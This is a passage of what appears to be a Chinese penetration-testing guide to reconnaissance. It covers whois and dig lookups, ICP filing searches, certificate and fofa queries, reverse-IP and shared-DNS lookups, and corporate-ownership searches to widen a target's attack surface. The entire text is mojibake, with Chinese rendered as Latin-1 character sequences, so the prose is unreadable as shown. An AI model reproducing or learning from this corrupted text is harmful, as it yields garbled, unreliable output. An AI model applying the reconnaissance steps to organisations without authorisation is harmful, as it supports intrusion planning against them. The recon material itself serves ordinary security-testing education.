15ã€ä¼ä¸šä¿¡æ¯ï¼ˆå¤©çœ¼æŸ¥ã€ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿã€å·¥ä¸šå’Œä¿¡æ¯åŒ–éƒ¨ICP/IPåœ°å€/åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿï¼‰ 3.3 ç›®æ ‡ç¡®è®¤ åŸŸåæ³¨å†Œä¿¡æ¯ï¼ˆä¸»åŸŸåæŸ¥è¯¢ï¼‰ é€šè¿‡å¦‚ä¸‹æ­¥éª¤ç¡®è®¤ç›®æ ‡æ‰€æœ‰è€…ä¿¡æ¯ï¼š Whois ç›®æ ‡åŸŸå/ä¸»æœºåï¼šwhois http://example.com è§£æç›®æ ‡åŸŸå/ä¸»æœºåçš„IPåœ°å€ï¼šdig +short http://example.com è·å–åŸŸåçš„è¯¦ç»†è§£æè¿‡ç¨‹ï¼šdig +trace http://example.com åç»­ç”¨äºå­—å…¸åˆ¶ä½œå’Œè¿›ä¸€æ­¥æ”¶é›†ç›®æ ‡ä¿¡æ¯çš„åŸºç¡€ whoisæŸ¥è¯¢ whoiså°±æ˜¯ä¸€ä¸ªç”¨æ¥æŸ¥è¯¢åŸŸåæ˜¯å¦å·²ç»è¢«æ³¨å†Œï¼Œä»¥åŠæ³¨å†ŒåŸŸåçš„è¯¦ç»†ä¿¡æ¯çš„æ•°æ®åº“ï¼ˆå¦‚åŸŸåæ‰€æœ‰äººã€åŸŸåæ³¨å†Œå•†ï¼‰ã€‚ whoisä¿¡æ¯å¯ä»¥è·å–å…³é”®æ³¨å†Œäººçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨å†Œå•†ã€è”ç³»äººã€è”ç³»é‚®ç®±ã€è”ç³»ç”µè¯ã€åˆ›å»ºæ—¶é—´ç­‰,å¯ä»¥è¿›è¡Œé‚®ç®±åæŸ¥åŸŸåï¼Œçˆ†ç ´é‚®ç®±ï¼Œç¤¾å·¥ï¼ŒåŸŸååŠ«æŒç­‰ç­‰ã€‚ æ³¨ï¼šä¸åŒåŸŸååç¼€çš„whoisä¿¡æ¯éœ€è¦åˆ°ä¸åŒçš„whoisæ•°æ®åº“æŸ¥è¯¢ ä¸»è¦çš„å®ç°åŸç†ï¼š 1.æ ¹æ®åŸŸåä»æ ¹æœåŠ¡å™¨è·å–åŸŸåæ‰€åœ¨whoisæœåŠ¡å™¨ 2.å†æ ¹æ®åŸŸåä»åŸŸåæ‰€åœ¨whoisæœåŠ¡å™¨è·å–åŸŸåä¿¡æ¯ å³ domain + rootServer =&gt; targetServer domain + targetServer =&gt; domainInfo å½“ç„¶ï¼Œå¦‚æœçŸ¥é“äº†åŸŸåä¿¡æ¯æ‰€åœ¨æœåŠ¡å™¨ï¼Œå¯ä»¥è·³è¿‡ç¬¬ä¸€æ­¥ï¼Œç›´æ¥æŸ¥è¯¢åŸŸåä¿¡æ¯ ä¸‹é¢å®æ“ä¸€æ‰‹ã€‚ æ–¹æ³•ä¸€ï¼šæ ¹æœåŠ¡å™¨ é€šè¿‡åŸå§‹ç½‘é¡µæŸ¥è¯¢ï¼šé¦–å…ˆæ ¹æ®åŸŸåä»whoisçš„æ ¹æœåŠ¡å™¨è·å–åŸŸåæ‰€åœ¨çš„whoisæœåŠ¡å™¨ï¼šhttps://www.iana.org/whois æˆ–è€…æ ¹æ®åŸŸååç¼€åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢å¯¹åº”whoisæœåŠ¡å™¨åœ°å€ï¼šhttps://www.iana.org/domains/root/db è¿™é‡Œæˆ‘ä»¬å°±ä»¥.cnä¸ºä¾‹ï¼ŒæŸ¥è¯¢ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°è¯¥åŸŸåå¯¹åº”çš„whoisæœåŠ¡å™¨ æ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®å¾—åˆ°çš„whoisæœåŠ¡å™¨è·å–åŸŸåä¿¡æ¯ï¼Œç»“æœå¦‚ä¸‹ï¼Œä½†è¿™é‡Œåªèƒ½æŸ¥è¯¢ä¸€çº§åŸŸåï¼Œä¸èƒ½æºå¸¦wwwä¹‹ç±»çš„å‰ç¼€ è¿™é‡Œä¹Ÿèƒ½çœ‹åˆ°å¦‚æœåŸŸååç¼€ä¸å¯¹åº”ï¼Œä¹Ÿæ˜¯æŸ¥è¯¢ä¸åˆ°çš„ æ–¹æ³•äºŒï¼šç¬¬ä¸‰æ–¹æœåŠ¡æŸ¥è¯¢ https://whois.aliyun.com/ https://whois.cloud.tencent.com/ https://who.is/ https://www.whois.com/whois/ https://whois.chinaz.com/ https://whois.aizhan.com/ ä¸‹æ–¹æœ‰å¯¹åº”çš„è‹±æ–‡è¯¦ç»†ä¿¡æ¯ï¼š ä½“éªŒä¸‹æ¥æ„Ÿè§‰https://www.whois.com/whoisæ›´å¥½ä¸€ç‚¹ï¼Œä¿¡æ¯æŒºå®Œå–„çš„ã€‚ä¸è¿‡æœ¬è´¨æ¥ä¼¼ä¹éƒ½æ˜¯æ¥è‡ªwhoisæ ¹æœåŠ¡å™¨æŸ¥è¯¢åˆ°çš„ä¿¡æ¯ï¼Œæ•´åˆäº†ä¸€ä¸‹è€Œå·²ã€‚è€Œé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘çš„æ„Ÿè§‰ç”¨äºæŸ¥å›½å†…å°±è¡Œäº†ï¼Œæœ€åä¸€ä¸ªç«™é•¿å·¥å…·çš„whoisä¸å¤ªå®Œå–„ï¼Œä½†ç›´æ¥æä¾›äº†åæŸ¥åŠŸèƒ½ï¼Œæ„Ÿè§‰è¿˜ç®—ä¸é”™ï¼ˆæ„Ÿè§‰æ˜¯æŸ¥å›½å†…æŒºæ•ˆç‡çš„å·¥å…·äº†ï¼‰ è¿™é‡Œè¿˜æœ‰çˆ±ç«™ è¿™é‡Œæœ€å…¨é¢çš„æ„Ÿè§‰å°±æ˜¯å¾®æ­¥ç¤¾åŒºäº† å¯ä»¥çœ‹åˆ°ç»“æœå¾ˆå…¨é¢ï¼Œå°±æ˜¯æƒ³è¦æŸ¥è¯¢ä¸€äº›éšç§è¿˜å¾—æ°ªé‡‘~~~ æ–¹æ³•ä¸‰ï¼šwhoiså‘½ä»¤ å°±æ˜¯ç”¨whoiså‘½ä»¤è¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™ä¸ªå‘½ä»¤åœ¨Linuxä¸Windowsä¸‹éƒ½å¯å®‰è£…ï¼Œè¿™é‡Œç”¨Linuxæ¼”ç¤ºäº†ï¼Œè‡³äºå®‰è£…åŠæ³•å°±ä¸èµ˜è¿°äº† åŒæ ·çš„å¦‚ä¸‹å›¾ï¼ŒäºŒçº§åŸŸåå°±æŸ¥è¯¢ä¸åˆ°äº† è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å›½é™…åŸŸåå¯ä»¥è®¾ç½®éšç§ä¿æŠ¤ï¼Œä½†åƒå›½å†….cnç­‰åŸŸåæ˜¯ä¸å¯ä»¥è®¾ç½®éšç§ä¿æŠ¤çš„ã€‚ æ–¹æ³•å››ï¼šä¸­æ–‡åŸŸå è¿™é‡Œçœ‹äº†å‡ ç¯‡æ–‡ç« ï¼Œè¿˜æœ‰ç”¨ä»£ç å»å®ç°çš„ï¼ˆè‡ªæˆ‘æ„Ÿè§‰æ²¡å¤ªå¿…è¦ï¼‰ï¼Œè¿™é‡Œçš„ä»£ç å¯ä»¥è‡ªå·±å†™ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ç¬¬ä¸‰æ–¹åº“ å…·ä½“çš„æ„Ÿå…´è¶£å‚è€ƒï¼šä¸€æ–‡æå®šï¼šwhoisæ•°æ®åº“æŸ¥è¯¢åŸŸåä¿¡æ¯ï¼ˆWHOISï¼‰ è¿™é‡Œä»‹ç»è¿™ç¯‡æ–‡ç« æåˆ°çš„ä¸­æ–‡åŸŸåæŸ¥è¯¢ã€‚ã€‚ã€‚ ä»–è¿™é‡Œè¯´ï¼šé€šè¿‡æ¥å£ç›´æ¥æŸ¥è¯¢ä¸­æ–‡åŸŸåï¼Œä¼šæç¤ºæ²¡æœ‰æŸ¥è¯¢ç»“æœã€‚è¿™æ—¶å€™éœ€è¦å°†ä¸­æ–‡åŸŸåè¿›è¡Œç¼–ç  åœ¨çº¿ç¼–ç ï¼šhttp://tools.jb51.net/punycode/index.php å…¶å®ï¼Œä¸­æ–‡åç¼€çš„åŸŸåå¯ä»¥ä¸ç¼–ç ï¼Œä¸»è¦æ˜¯ä¸­è‹±ç»“åˆçš„åŸŸå, æ¯”å¦‚ http://ä¸­ä¸‡.cn/ ä»æµè§ˆå™¨ç›´æ¥å¤åˆ¶è¿‡æ¥æ˜¯http://xnâ€“chq7c.cn/ è¿™æ˜¯ä¸€ç§å«åšï¼šPunycodeçš„ç¼–ç æ–¹å¼ print(\"ä¸­ä¸‡\".encode('punycode').decode()) # chq7c 12 ç„¶ååŠ ä¸Šå‰ç¼€xn--ï¼Œå°±å’Œä¸Šé¢çš„ç»“æœä¸€è‡´äº† xn--chq7c å¯ä»¥çœ‹åˆ°è¿˜æ˜¯å¯ä»¥æŸ¥è¯¢åˆ°çš„ï¼Œä¸è¿‡è¿™é‡Œå¦‚æœè¿›å…¥å…¶å¯¹åº”çš„referæœåŠ¡å™¨ä¸­å°±æŸ¥è¯¢é”™è¯¯ï¼ˆæ ¼å¼ä¸æ­£ç¡®ï¼‰ ä¸è¿‡è¿™é‡Œç«Ÿç„¶å¯ä»¥ç›´æ¥ä¸­æ–‡åŸŸåæŸ¥è¯¢ï¼ï¼å½“ç„¶whoisæ ¹æœåŠ¡å™¨ä¹Ÿå¯ä»¥ è¿™é‡Œé™„ä¸Šä¸€ä¸ªwhoisæŸ¥è¯¢ä¿¡æ¯çš„è§£é‡Šï¼š 01 whoisï¼šæ˜¯æŸ¥è¯¢å‘½ä»¤ 02 qqpk.cnï¼šæ˜¯è¦æŸ¥è¯¢çš„åŸŸå 03 Domain.nameï¼šåŸŸå 04 ROIDï¼šæ˜¯Register Object IDå·ï¼Œç›¸å½“äºæ³¨å†Œå¯¹è±¡çš„ä¸€ä¸ªèº«ä»½è¯å·ç  05 Domain Status: CLIENT TRANSFER PROHIBITED ã€ä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯ç¦æ­¢è½¬ç§»ï¼Œè¯¥çŠ¶æ€ç”±æ³¨å†Œå•†è®¾ç½®ï¼ŒåŸŸåå¯ä»¥æ›´æ–°ï¼ˆåŸŸåä¿¡æ¯ä¿®æ”¹ï¼‰ã€ç»­è´¹ã€åˆ é™¤ï¼Œéœ€è¦æŒ‡æ´¾è‡³å°‘ä¸€å°åŸŸåæœåŠ¡å™¨åˆ™å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ã€‘ 06 Registrantï¼šåŸŸåæ³¨å†Œäººçš„å§“å 07 Registrant Contact Emailï¼šæ³¨å†Œäººçš„è”ç³»é‚®ç®± 08 Sponsoring Registrarï¼šæ³¨å†Œå•† ã€ä»–ä»¬è¿›è¡ŒæŠ¢æ³¨åŸŸåï¼Œç„¶åè¿›è¡Œhighä»·è½¬è®©çš„å…¬å¸ã€‘ 09 Name Serverï¼šä¹Ÿå°±æ˜¯DNSåŸŸåè§£ææœåŠ¡å™¨ï¼Œå®ƒåœ¨äº’è”ç½‘çš„ä½œç”¨æ˜¯æŠŠåŸŸåè½¬æ¢æˆä¸ºç½‘ç»œå¯ä»¥è¯†åˆ«çš„IPåœ°å€ 10 Registration Timeï¼šæ³¨å†Œè¯¥åŸŸåçš„æ—¶é—´ 11 Expiration Timeï¼šè¯¥åŸŸååˆ°æœŸæ—¶é—´ 12 DNSSECï¼šunsigne ã€DNSSEC=Domain Name System Security Extensions (DNSSEC)ï¼ŒDNSå®‰å…¨æ‰©å±•ï¼Œæ˜¯ç”±IETFæä¾›çš„ä¸€ç³»åˆ—DNSå®‰å…¨è®¤è¯çš„æœºåˆ¶ï¼ˆå¯å‚è€ƒRFC2535ï¼‰ã€‚å®ƒæä¾›äº†ä¸€ç§æ¥æºé‰´å®šå’Œæ•°æ®å®Œæ•´æ€§çš„æ‰©å±•ï¼Œä½†ä¸å»ä¿éšœå¯ç”¨æ€§ã€åŠ å¯†æ€§å’Œè¯å®åŸŸåä¸å­˜åœ¨ã€‚ã€‘ ã€Unsignedï¼šæœªè®¾ç½®ã€æœªéƒ¨ç½²ã€‘ digæŸ¥è¯¢ digï¼ˆdomain information groupï¼‰æ˜¯å¸¸ç”¨çš„åŸŸåæŸ¥è¯¢å·¥å…·ï¼Œå¯ä»¥ä»DNSåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ä¸»æœºåœ°å€ä¿¡æ¯ï¼Œè·å–åˆ°è¯¦ç»†çš„åŸŸåä¿¡æ¯ã€‚è¿™ä¸ªå‘½ä»¤æ˜¯Bindçš„ä¸€éƒ¨åˆ†ï¼Œæœ¬èº«å¹¶æ²¡æœ‰åœ¨Windowså’ŒLinuxç³»ç»Ÿä¸­é›†æˆï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨è¯¥å‘½ä»¤å°±éœ€è¦å…ˆä¸‹è½½ç›¸åº”çš„è½¯ä»¶åŒ…ã€‚â€“è‡³äºä¸‹è½½æ–¹å¼è¿™é‡Œå°±ä¸è¯´äº† è¿™é‡Œè¡¥å……ä¸€ä¸‹å¯¹äºèµ„æºè®°å½•(RR)çš„å››ä¸ªå…ƒç»„çš„çŸ¥è¯†ï¼š Aè®°å½• IPåœ°å€è®°å½•,è®°å½•ä¸€ä¸ªåŸŸåå¯¹åº”çš„IPåœ°å€ AAAAè®°å½• IPv6åœ°å€è®°å½•ï¼Œè®°å½•ä¸€ä¸ªåŸŸåå¯¹åº”çš„IPv6åœ°å€ CNAMEè®°å½• åˆ«åè®°å½•ï¼Œè®°å½•ä¸€ä¸ªä¸»æœºçš„åˆ«å MXè®°å½• ç”µå­é‚®ä»¶äº¤æ¢è®°å½•ï¼Œè®°å½•ä¸€ä¸ªé‚®ä»¶åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œæ¯”å¦‚my[at]lijiejie.com åé¢çš„éƒ¨åˆ†lijiejie.comï¼Œé‚®ä»¶æœåŠ¡å™¨å¯¹åº”çš„IPåœ°å€ NSè®°å½• åŸŸåæœåŠ¡å™¨è®°å½• ,è®°å½•è¯¥åŸŸåç”±å“ªå°åŸŸåæœåŠ¡å™¨è§£æ PTRè®°å½• åå‘è®°å½•ï¼Œä¹Ÿå³ä»IPåœ°å€åˆ°åŸŸåçš„ä¸€æ¡è®°å½• TXTè®°å½• è®°å½•åŸŸåçš„ç›¸å…³æ–‡æœ¬ä¿¡æ¯ SOAè®°å½• start of anthorization å¼€å§‹æˆæƒï¼Œæ˜¯ä¸€ç§æ¯”è¾ƒéš¾ä»¥ç†è§£çš„è®°å½•å€¼ï¼Œä¸€èˆ¬äºŒçº§åŸŸåæ‰ä¼šæœ‰ ç®€å•ä½¿ç”¨ï¼šdig www.baidu.com å¯¹ä¸€äº›å­—æ®µçš„è§£é‡Šï¼š ç¬¬ä¸€äºŒè¡Œï¼šè¾“å‡ºäº†æœ‰å…³digçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå’Œå…¨å±€è®¾ç½®é€‰é¡¹ï¼š+cmdï¼Œä»¥åŠè¾“å…¥å‚æ•°ä¿¡æ¯ Got answerï¼šè¾“å‡ºäº†ä»DNSè¿”å›çš„æŠ€æœ¯ä¿¡æ¯ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯ statusï¼Œå¦‚æœ status çš„å€¼ä¸º NOERROR ï¼Œåˆ™è¯´æ˜æœ¬æ¬¡æŸ¥è¯¢æˆåŠŸã€‚è¿™æ®µä¿¡æ¯å¯ä»¥ç”¨é€‰é¡¹ [no]comments æ¥æ§åˆ¶æ˜¯å¦æ˜¾ç¤ºï¼Œä½†æ˜¯å°å¿ƒç¦æ­¢æ‰commentsä¹Ÿå¯èƒ½å…³é—­ä¸€äº›å…¶å®ƒçš„é€‰é¡¹ã€‚ QUESTION SECTIONï¼šæŸ¥è¯¢å­—æ®µï¼Œæ˜¾ç¤ºäº†æˆ‘ä»¬æŸ¥è¯¢çš„åŸŸåä»¥åŠæŸ¥è¯¢çš„æœåŠ¡ï¼ŒAä»£è¡¨çš„æ˜¯æŸ¥è¯¢Aè®°å½•ï¼Œå³ä¸»æœºæŸ¥è¯¢ ANSWER SECTIONï¼šå›ç­”å­—æ®µè¿™é‡Œçš„ç»“æœè¡¨ç¤ºï¼šè¦æŸ¥è¯¢www.baidu.comå…ˆæŸ¥è¯¢CNAMEè®°å½•ï¼Œå¯¹www.a.shifen.comè¿›è¡Œè®¿é—®ï¼Œå½“æˆ‘ä»¬è®¿é—®www.a.shifen.comåï¼Œè¯¥ä¸»æœºè®©æˆ‘ä»¬è®¿é—®110.242.68.3ï¼Œæˆ‘ä»¬è®¿é—®110.242.68.3åï¼Œè¿™ä¸ªipçš„ä¸»æœºä¼šå‘Šè¯‰æˆ‘ä»¬www.baidu.comçš„IPæ˜¯110.242.68.4 è¿™éƒ¨åˆ†æ˜¾ç¤ºäº†è¯·æ±‚æ‰€èŠ±çš„æ—¶é—´ï¼ŒdnsæœåŠ¡å™¨ï¼Œå½“å‰æ—¶é—´ï¼Œä»¥åŠæŸ¥è¯¢ä¿¡æ¯çš„å¤§å° è¿˜æœ‰ä¸€ä¸ªå€¼å¾—è®°å½•çš„æ˜¯-xé€‰é¡¹ï¼Œè¯´æ˜¯æ ¹æ®IPåæŸ¥åŸŸåï¼ˆå¦å¤–æ¯ä¸ªå‘½ä»¤åé¢æ·»åŠ +shortå¯ä»¥ç®€åŒ–è¾“å‡ºä¿¡æ¯ï¼‰ dig -x 183.84.6.134\t# è®¿é—®PTRè®°å½•ï¼ŒæŸ¥è¯¢è¯¥IPåœ°å€æ‰€å¯¹åº”çš„ä¸»æœºåï¼ŒDNSè§£ææ˜¯ç”¨åŸŸåæŸ¥IPï¼Œè€ŒPTRè®°å½•æ˜¯IPæŸ¥åŸŸå ä¸è¿‡è¿™é‡Œå§‹ç»ˆæ²¡çœ‹å‡ºæ¥åŸŸååœ¨å“ªé‡Œã€‚ã€‚ã€‚ã€‚è¿˜æœ‰ä¸€ä¸ª+traceå‘½ä»¤å¯ä»¥çœ‹åˆ°åŸŸåè§£æè¯¦ç»†è¿‡ç¨‹ ICPå¤‡æ¡ˆæŸ¥è¯¢ ICPå¤‡æ¡ˆæ˜¯æŒ‡ç½‘ç«™åœ¨ä¿¡æ¯äº§ä¸šéƒ¨æäº¤ç½‘ç«™ä¿¡æ¯è¿›è¡Œå®˜æ–¹è®¤å¯ã€‚å¯¹å›½å†…å„å¤§å°ç½‘ç«™(åŒ…æ‹¬ä¼ä¸šåŠä¸ªäººç«™ç‚¹)çš„ä¸¥æ ¼å®¡æŸ¥å·¥ä½œï¼Œå¯¹äºæ²¡æœ‰åˆæ³•å¤‡æ¡ˆçš„éç»è¥æ€§ç½‘ç«™æˆ–æ²¡æœ‰å–å¾—ICPè®¸å¯è¯çš„ç»è¥æ€§ç½‘ç«™ï¼Œæ ¹æ®ç½‘ç«™æ€§è´¨ï¼Œå°†äºˆä»¥ç½šæ¬¾ï¼Œä¸¥é‡çš„å…³é—­ç½‘ç«™ï¼Œä»¥æ­¤è§„èŒƒç½‘ç»œå®‰å…¨ï¼Œæ‰“å‡»ä¸€åˆ‡åˆ©ç”¨ç½‘ç»œèµ„æºè¿›è¡Œä¸æ³•æ´»åŠ¨çš„çŠ¯ç½ªè¡Œä¸ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æ˜¯ç›ˆåˆ©ä¸ºç›®çš„çš„ç½‘ç«™ï¼Œéƒ½è¦è¿›è¡ŒICPå¤‡æ¡ˆï¼Œå¦åˆ™ä¼šå—åˆ°ç›¸åº”çš„å¤„ç½šã€‚ å›½å†…ä½¿ç”¨å›½å†…æœåŠ¡å™¨çš„ç½‘ç«™ï¼Œéƒ½å¿…é¡»è¦å…ˆåŠç†ICPå¤‡æ¡ˆåæ‰å¯ä»¥ä¸Šçº¿ã€‚ é€šè¿‡æŸ¥è¯¢ç›®æ ‡ä¼ä¸šçš„å¤‡æ¡ˆä¿¡æ¯ï¼Œå¯ç›´æ¥è·å–åˆ°ç›®æ ‡ä¼ä¸šæ³¨å†Œäº†å“ªäº›åŸŸåï¼Œä»è€Œå¢åŠ å¯æ¸—é€çš„ç›®æ ‡èŒƒå›´ã€‚ æ¨èä½¿ç”¨å®˜æ–¹ç½‘ç«™ICP/IPåœ°å€/åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿ â€”â€”æ”¯æŒä½¿ç”¨å•ä½åç§°ã€åŸŸåå’Œå¤‡æ¡ˆå·è¿›è¡ŒæŸ¥è¯¢ ç«™é•¿å·¥å…· çˆ±ç«™ç½‘ ç«™é•¿seoç»¼åˆæŸ¥è¯¢å·¥å…·-çˆ±ç«™ç½‘ è¯ä¹¦æŸ¥è¯¢ SSLè¯ä¹¦æ˜¯ä¸€ç§éµå®ˆSSLåè®®çš„æœåŠ¡å™¨æ•°å­—è¯ä¹¦ï¼Œç”±å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„é¢å‘ã€‚ SSLè¯ä¹¦é‡‡ç”¨SSLåè®®è¿›è¡Œé€šä¿¡ï¼ŒSSLè¯ä¹¦éƒ¨ç½²åˆ°æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨ç«¯çš„è®¿é—®å°†å¯ç”¨HTTPSåè®®ã€‚ æ‚¨çš„ç½‘ç«™å°†ä¼šé€šè¿‡HTTPSåŠ å¯†åè®®æ¥ä¼ è¾“æ•°æ®ï¼Œå¯å¸®åŠ©æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´å»ºç«‹åŠ å¯†é“¾æ¥ï¼Œä»è€Œä¿è¯æ•°æ®ä¼ è¾“çš„å®‰å…¨ã€‚ é€šè¿‡æŸ¥è¯¢å…±ç”¨SSLè¯ä¹¦çš„ç½‘ç«™ï¼Œå¯ä»¥æ‰¾åˆ°ç›¸å…³çš„å…¶ä»–åŸŸåã€‚ ç¬¬ä¸€ç§å¯ä»¥æµè§ˆå™¨ç›´æ¥æŸ¥çœ‹ï¼Œå¦‚ä¸‹å›¾ï¼Œç‚¹å‡»æ›´å¤šä¿¡æ¯ æ¥ç€ç‚¹å‡»ä¸Šå›¾çš„æŸ¥çœ‹è¯ä¹¦å³å¯ ç¬¬äºŒç§æ˜¯åˆ©ç”¨åœ¨çº¿ç½‘ç«™æŸ¥è¯¢ï¼š crt.sh ç¬¬ä¸‰ç§æ˜¯é€šè¿‡ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ å¯æŸ¥è¯¢fofaè¯­æ³•æ‰‹å†Œï¼š è¯­æ³• è¯´æ˜ cert=\"baidu\" æœç´¢è¯ä¹¦(httpsæˆ–è€…imapsç­‰)ä¸­å¸¦æœ‰baiduçš„èµ„äº§ã€‚ cert.subject=\"Oracle Corporation\" æœç´¢è¯ä¹¦æŒæœ‰è€…æ˜¯Oracle Corporationçš„èµ„äº§ cert.issuer=\"DigiCert\" æœç´¢è¯ä¹¦é¢å‘è€…ä¸ºDigiCert Incçš„èµ„äº§ cert.is_valid=true éªŒè¯è¯ä¹¦æ˜¯å¦æœ‰æ•ˆï¼Œtrueæœ‰æ•ˆï¼Œfalseæ— æ•ˆ DNSå…±äº«è®°å½•æŸ¥è¯¢ DNSï¼ˆDomain Name Serverï¼ŒåŸŸåæœåŠ¡å™¨ï¼‰æ˜¯è¿›è¡ŒåŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)è½¬æ¢çš„æœåŠ¡å™¨ã€‚DNSä¸­ä¿å­˜äº†ä¸€å¼ åŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)çš„è¡¨ï¼Œä»¥è§£ææ¶ˆæ¯çš„åŸŸåã€‚ åŸŸåæ˜¯Internetä¸ŠæŸä¸€å°è®¡ç®—æœºæˆ–è®¡ç®—æœºç»„çš„åç§°ï¼Œç”¨äºåœ¨æ•°æ®ä¼ è¾“æ—¶æ ‡è¯†è®¡ç®—æœºçš„ç”µå­æ–¹ä½ï¼ˆæœ‰æ—¶ä¹ŸæŒ‡åœ°ç†ä½ç½®ï¼‰ã€‚åŸŸåæ˜¯ç”±ä¸€ä¸²ç”¨ç‚¹åˆ†éš”çš„åå­—ç»„æˆçš„ï¼Œé€šå¸¸åŒ…å«ç»„ç»‡åï¼Œè€Œä¸”å§‹ç»ˆåŒ…æ‹¬ä¸¤åˆ°ä¸‰ä¸ªå­—æ¯çš„åç¼€ï¼Œä»¥æŒ‡æ˜ç»„ç»‡çš„ç±»å‹æˆ–è¯¥åŸŸæ‰€åœ¨çš„å›½å®¶æˆ–åœ°åŒºã€‚ æ­¤å¤„é€šè¿‡æŸ¥è¯¢å…±äº«DNSæœåŠ¡å™¨çš„ä¸»æœºæ¥è·å–åˆ°ç›¸å…³çš„åŸŸåï¼›éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ˜¯å…¬å¼€çš„DNSæœåŠ¡å™¨ï¼Œé‚£ä¹ˆæŸ¥è¯¢çš„æ•ˆæœå°†ä¼šç‰¹åˆ«å·®ã€‚ é¦–å…ˆæŸ¥è¯¢ç›®æ ‡æ˜¯å¦å­˜åœ¨è‡ªå»ºçš„NSæœåŠ¡å™¨ å°†è·å–åˆ°çš„NSæœåŠ¡å™¨å¸¦å…¥ https://hackertarget.com/find-shared-dns-servers/ è¿›è¡ŒæŸ¥è¯¢ æ­¤å¤„æŸ¥è¯¢çš„ç»“æœå¹¶ä¸å…¨æ˜¯å±äºç›®æ ‡èŒƒå›´ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„ç¡®è®¤å’Œè§‚å¯Ÿã€‚ IPåæŸ¥ ç›®æ ‡å¤šä¸ªåŸŸåå¯èƒ½ç»‘å®šåœ¨åŒä¸€IPä¸Šï¼Œé€šè¿‡IPåæŸ¥ä¸€å®šæƒ…å†µä¸‹å¯è·å–åˆ°å…¶ä»–çš„åŸŸåä¿¡æ¯ã€‚ åŒIPç½‘ç«™æŸ¥è¯¢ï¼ŒåŒæœåŠ¡å™¨ç½‘ç«™æŸ¥è¯¢ - ç«™é•¿å·¥å…· Online investigation tool - Reverse IP, NS, MX, WHOIS and Search Tools è¾“å…¥ç›¸å…³çš„åŸŸåæˆ–IPåœ°å€å³å¯æŸ¥è¯¢ã€‚ æœç´¢å¼•æ“æœç´¢IPåæŸ¥åŸŸåå³å¯ï¼Œä½†æœ‰æ—¶å€™æ•ˆæœå¹¶ä¸ç†æƒ³ï¼Œå¾ˆå¤šæƒ…å†µæŸ¥ä¸åˆ° æ¨èä½¿ç”¨å¹³å°ï¼šhttps://securitytrails.com/dns-trails fofaã€zoomeyeã€hunterã€quakeç­‰ï¼Œæœ€æ¨èçš„è¿˜æ˜¯hunterï¼Œæ•ˆæœæœ€å¥½ï¼Œèƒ½æŸ¥åˆ°å¾ˆå¤šä¸œè¥¿ https://hunter.qianxin.com/list?search=ip%3D\"220.181.38.251\" è‚¡æƒä¿¡æ¯ é€šè¿‡æŸ¥è¯¢è‚¡æƒä¿¡æ¯ï¼Œæˆ–è€…è‚¡æƒç©¿é€å›¾ï¼Œå¯»æ‰¾å­å…¬å¸å’Œå­™å…¬å¸ç­‰ï¼Œä¸€èˆ¬å¯¹å¤–æŠ•èµ„è¶…è¿‡50%æˆ–è€…æœ‰è¡Œæ”¿æƒé™çš„éƒ½å¯ä»¥ç®—ç›®æ ‡ å¤©çœ¼æŸ¥ï¼šhttps://www.tianyancha.com/ ä¼æŸ¥æŸ¥ï¼šhttps://www.qcc.com/ å¦‚æŸ¥è¯¢å­—èŠ‚è·³åŠ¨ é€šè¿‡æŸ¥è¯¢å­å…¬å¸ï¼Œå†æŸ¥è¯¢å­å…¬å¸å¯¹åº”çš„äº§å“ï¼Œå¯ä»¥å¤§èŒƒå›´çš„æ‰©å¤§æ”»å‡»é¢ å·¥å…·æ¨è https://github.com/wgpsec/ENScan_GO https://github.com/i11us0ry/AScan Hackerone ä¸€äº›åœ¨hackeroneä¸Šè¿›è¡Œä¼—æµ‹çš„å‚å•†ï¼Œä¼šæŠŠè‡ªå·±çš„æµ‹è¯•èŒƒå›´åˆ—ä¸¾å‡ºæ¥ï¼Œå…¶ä¸­å°±åŒ…å«æœ‰å¤§é‡çš„åŸŸåï¼Œå› æ­¤é€šè¿‡hackeroneæ¥å®Œå–„èµ„äº§æ”¶é›†ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„æ–¹æ³•ã€‚ ä»¥é˜¿é‡Œä¸ºä¾‹ï¼šhttps://hackerone.com/alibaba?type=team&amp;view_policy=true Google Googleç›´æ¥æœç´¢é‡Œé¢çš„ä¸€äº›å…³é”®å†…å®¹æ¥æŸ¥è¯¢ï¼Œæ¯”å¦‚å…¬å¸åã€å¤‡æ¡ˆã€å¼•ç”¨çš„ç‰¹æ®Šjsç­‰ è¿˜æ˜¯ä»¥é˜¿é‡Œä¸ºä¾‹ï¼ˆåˆ«äººçš„æˆæœå›¾ï¼‰ intext:æµ™ICPå¤‡09048685å· intext:11040102700068 -www å›½å®¶ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ 